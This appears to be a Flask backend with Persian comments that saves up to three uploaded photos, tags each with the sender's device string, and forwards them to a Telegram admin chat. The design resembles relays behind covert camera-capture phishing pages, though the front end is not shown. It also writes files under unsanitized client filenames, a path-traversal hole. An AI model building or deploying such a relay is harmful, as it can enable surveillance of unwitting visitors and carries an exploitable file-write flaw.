import os
import requests
from flask import Flask, render_template, request

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")  # می‌تواند عدد یا @username باشد
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload():
    device = request.form.get("device", "Unknown")
    sent_photos = 0

    for i in range(3):
        photo = request.files.get(f"photo{i}")
        if photo and photo.filename != "":
            filepath = os.path.join(UPLOAD_FOLDER, photo.filename)
            photo.save(filepath)

            # ارسال عکس به تلگرام
            with open(filepath, "rb") as f:
                files = {"photo": (photo.filename, f, photo.mimetype)}
                data = {
                    "chat_id": ADMIN_ID,
                    "caption": f"📸 Photo {i+1}\n👤 ID: @Vertul_king\n📱 {device}"
                }
                response = requests.post(API_URL, data=data, files=files, timeout=20)
                print(response.text)

            sent_photos += 1

    if sent_photos == 0:
        return "هیچ عکسی انتخاب نشده یا مشکل در فایل وجود دارد!", 400

    return f"{sent_photos} عکس ارسال شد."